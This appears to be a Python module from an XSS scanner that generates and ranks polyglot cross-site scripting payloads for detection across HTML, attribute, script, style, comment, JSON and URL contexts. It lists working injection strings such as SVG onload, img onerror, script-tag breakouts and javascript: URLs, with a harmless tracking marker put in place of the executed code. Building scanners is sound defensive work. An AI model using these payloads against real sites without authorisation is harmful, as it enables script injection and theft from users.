"""
Polyglot payload generator for multi-context XSS detection.
"""

import re
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass
from enum import Enum


class PolyglotContext(Enum):
    """Polyglot payload contexts."""
    HTML = "html"
    ATTR_DOUBLE = "attr_double"
    ATTR_SINGLE = "attr_single"
    ATTR_UNQUOTED = "attr_unquoted"
    SCRIPT = "script"
    STYLE = "style"
    COMMENT = "comment"
    JSON = "json"
    URL = "url"


@dataclass
class PolyglotPayload:
    """A payload that works in multiple contexts."""
    payload: str
    contexts: List[PolyglotContext]
    marker: str
    description: str
    coverage_score: float


class PolyglotGenerator:
    """
    Advanced polyglot payload generator.
    Creates payloads that execute in multiple contexts simultaneously.
    """

    # Universal polyglot templates
    UNIVERSAL_POLYGLOTS = [
        (
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */{marker}() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd={marker}()//>\\x3e",
            [PolyglotContext.HTML, PolyglotContext.ATTR_DOUBLE, PolyglotContext.ATTR_SINGLE, PolyglotContext.SCRIPT, PolyglotContext.URL, PolyglotContext.COMMENT, PolyglotContext.STYLE],
            "True universal vector polyglot (HTML/Attr/JS/URI/Comment/Style)",
        ),
        (
            "\"'><svg/onload=alert`{marker}`>",
            [PolyglotContext.ATTR_DOUBLE, PolyglotContext.ATTR_SINGLE, PolyglotContext.ATTR_UNQUOTED, PolyglotContext.HTML],
            "Parenthesis-less SVG attribute breakout polyglot",
        ),
        (
            "<script>/*<sCRIPT%20src=x%20onerror={marker}>*/</script>",
            [PolyglotContext.HTML, PolyglotContext.ATTR_DOUBLE, PolyglotContext.ATTR_SINGLE, PolyglotContext.ATTR_UNQUOTED],
            "Universal script tag polyglot"
        ),
        (
            "<script>/*<script>{marker}</script>*/</script>",
            [PolyglotContext.HTML, PolyglotContext.ATTR_DOUBLE, PolyglotContext.ATTR_SINGLE, PolyglotContext.SCRIPT],
            "HTML/Script polyglot"
        ),
        (
            "\"'><script>{marker}</script>",
            [PolyglotContext.ATTR_DOUBLE, PolyglotContext.ATTR_SINGLE, PolyglotContext.ATTR_UNQUOTED, PolyglotContext.HTML],
            "Attribute breakout polyglot"
        ),
        (
            "<img src=x onerror={marker}>\"'><script>{marker}</script>",
            [PolyglotContext.HTML, PolyglotContext.ATTR_DOUBLE, PolyglotContext.ATTR_SINGLE, PolyglotContext.ATTR_UNQUOTED],
            "Event handler + script polyglot"
        ),
        (
            "javascript:/*'<script>{marker}</script>*/",
            [PolyglotContext.URL, PolyglotContext.ATTR_DOUBLE, PolyglotContext.ATTR_SINGLE],
            "JavaScript URL polyglot"
        ),
        (
            "--><script>{marker}</script><!--",
            [PolyglotContext.COMMENT, PolyglotContext.HTML],
            "Comment escape polyglot"
        ),
        (
            "</style><script>{marker}</script><style>",
            [PolyglotContext.STYLE, PolyglotContext.HTML],
            "Style breakout polyglot"
        ),
        (
            "<script>/*<sCrIpT%20src=x%20onerror={marker}>*/</script>\"'><img src=x onerror={marker}>",
            [PolyglotContext.HTML, PolyglotContext.ATTR_DOUBLE, PolyglotContext.ATTR_SINGLE, PolyglotContext.ATTR_UNQUOTED],
            "Advanced multi-technique polyglot"
        ),
        (
            "</script><script>{marker}</script>",
            [PolyglotContext.SCRIPT, PolyglotContext.JSON, PolyglotContext.HTML],
            "JSON/Script breakout polyglot"
        ),
        (
            "<script>{marker}</script>\"'>",
            [PolyglotContext.HTML, PolyglotContext.ATTR_DOUBLE, PolyglotContext.ATTR_SINGLE, PolyglotContext.ATTR_UNQUOTED],
            "Minimal universal polyglot"
        ),
    ]

    # Context-specific polyglots
    CONTEXT_POLYGLOTS = {
        PolyglotContext.HTML: [
            "<script>{marker}</script>",
            "<img src=x onerror={marker}>",
            "<svg/onload={marker}>",
        ],
        PolyglotContext.ATTR_DOUBLE: [
            "\" onerror={marker} \"",
            "\"><script>{marker}</script>",
        ],
        PolyglotContext.ATTR_SINGLE: [
            "' onerror={marker} '",
            "'><script>{marker}</script>",
        ],
        PolyglotContext.ATTR_UNQUOTED: [
            " onerror={marker} ",
            "><script>{marker}</script>",
        ],
        PolyglotContext.SCRIPT: [
            ";{marker}//",
            ");{marker}//",
        ],
        PolyglotContext.URL: [
            "javascript:{marker}",
            "data:text/html,<script>{marker}</script>",
        ],
    }

    def __init__(self):
        self._generated_cache: Dict[Tuple[str, frozenset], List[PolyglotPayload]] = {}

    def generate_polyglots(
        self,
        marker: str,
        target_contexts: Optional[List[PolyglotContext]] = None,
        max_payloads: int = 10,
        prioritize_coverage: bool = True
    ) -> List[PolyglotPayload]:
        """
        Generate polyglot payloads for the given contexts.

        Args:
            marker: Unique marker string for verification
            target_contexts: Specific contexts to target (None = all); plain
                context strings (``"html"``, ``"attr_double"``) are accepted and
                converted, unknown names are ignored.
            max_payloads: Maximum number of payloads to return
            prioritize_coverage: Prioritize payloads that cover more contexts

        Returns:
            List of PolyglotPayload objects
        """
        if target_contexts is None:
            target_contexts = list(PolyglotContext)

        normalized: List[PolyglotContext] = []
        for context in target_contexts:
            if isinstance(context, PolyglotContext):
                enum_context = context
            else:
                try:
                    enum_context = PolyglotContext(str(context))
                except ValueError:
                    continue
            if enum_context not in normalized:
                normalized.append(enum_context)
        target_contexts = normalized
        if not target_contexts:
            # Unknown / mixed contexts: fall back to the universal set so the
            # caller still gets usable payloads.
            target_contexts = list(PolyglotContext)

        cache_key = (marker, frozenset(target_contexts))
        if cache_key in self._generated_cache:
            return self._generated_cache[cache_key][:max_payloads]

        scored_payloads = []

        # Score universal polyglots
        for template, contexts, description in self.UNIVERSAL_POLYGLOTS:
            matching_contexts = set(contexts) & set(target_contexts)
            score = len(matching_contexts)

            if score > 0:
                payload = self._inject_marker(template, marker)
                scored_payloads.append({
                    'payload': payload,
                    'contexts': list(matching_contexts),
                    'score': score,
                    'description': description
                })

        # Add context-specific polyglots
        for context in target_contexts:
            if context in self.CONTEXT_POLYGLOTS:
                for template in self.CONTEXT_POLYGLOTS[context]:
                    payload = self._inject_marker(template, marker)
                    scored_payloads.append({
                        'payload': payload,
                        'contexts': [context],
                        'score': 1,
                        'description': f"Context-specific {context.value} polyglot"
                    })

        # Sort by score if prioritizing coverage
        if prioritize_coverage:
            scored_payloads.sort(key=lambda x: x['score'], reverse=True)

        # Calculate coverage score
        results = []
        for item in scored_payloads[:max_payloads]:
            coverage_score = item['score'] / len(target_contexts)
            results.append(PolyglotPayload(
                payload=item['payload'],
                contexts=item['contexts'],
                marker=marker,
                description=item['description'],
                coverage_score=round(coverage_score, 2)
            ))

        self._generated_cache[cache_key] = results
        return results

    def _inject_marker(self, template: str, marker: str) -> str:
        """Inject the verification marker into a payload template."""
        marker_js = f"window.__xoxss_hits=window.__xoxss_hits||[];window.__xoxss_hits.push('{marker}')"
        template = re.sub(r'alert\s*\(\s*1\s*\)', marker_js, template)
        template = re.sub(r'alert\s*\(\s*"1"\s*\)', marker_js, template)
        template = re.sub(r'alert\s*\(\s*\'1\'\s*\)', marker_js, template)

        if '{marker}' in template:
            # Templates embed the marker as a placeholder; replace it with the
            # recording JS so browser execution can be detected and the token
            # string appears in the response for reflection checks.
            template = template.replace('{marker}', marker_js)

        if '{marker}' not in template and marker_js not in template:
            template = template.replace('<script>', f'<script>{marker_js};')

        return template

    def generate_smart_sequence(
        self,
        contexts: List[PolyglotContext],
        marker: str,
        limit: int = 5
    ) -> List[PolyglotPayload]:
        """
        Generate an optimized sequence of polyglots to cover all contexts.

        Uses a greedy algorithm to select polyglots that maximize
        context coverage with minimal payloads.

        Args:
            contexts: Contexts to cover
            marker: Verification marker
            limit: Maximum number of payloads

        Returns:
            Optimized list of PolyglotPayload objects
        """
        uncovered = set(contexts)
        selected = []

        while uncovered and len(selected) < limit:
            best_payload = None
            best_coverage = set()

            for template, template_contexts, description in self.UNIVERSAL_POLYGLOTS:
                coverage = set(template_contexts) & uncovered
                if len(coverage) > len(best_coverage):
                    best_coverage = coverage
                    best_payload = (template, description)

            if best_payload:
                template, description = best_payload
                payload = self._inject_marker(template, marker)
                coverage_score = len(best_coverage) / len(contexts)
                selected.append(PolyglotPayload(
                    payload=payload,
                    contexts=list(best_coverage),
                    marker=marker,
                    description=description,
                    coverage_score=round(coverage_score, 2)
                ))
                uncovered -= best_coverage
            else:
                break

        return selected

    def estimate_efficiency(
        self,
        contexts: List[PolyglotContext],
        use_polyglots: bool = True
    ) -> Dict[str, float]:
        """
        Estimate the efficiency gain from using polyglots.

        Args:
            contexts: List of contexts to test
            use_polyglots: Whether using polyglots or single-context payloads

        Returns:
            Dictionary with efficiency metrics
        """
        if not use_polyglots:
            return {
                'total_requests': len(contexts),
                'requests_saved': 0,
                'efficiency_gain': 0.0
            }

        without_polyglots = len(contexts)
        sequence = self.generate_smart_sequence(contexts, "test", limit=10)
        with_polyglots = len(sequence)

        requests_saved = without_polyglots - with_polyglots
        efficiency_gain = (requests_saved / without_polyglots) * 100 if without_polyglots > 0 else 0

        return {
            'total_requests': with_polyglots,
            'requests_saved': requests_saved,
            'efficiency_gain': round(efficiency_gain, 2)
        }
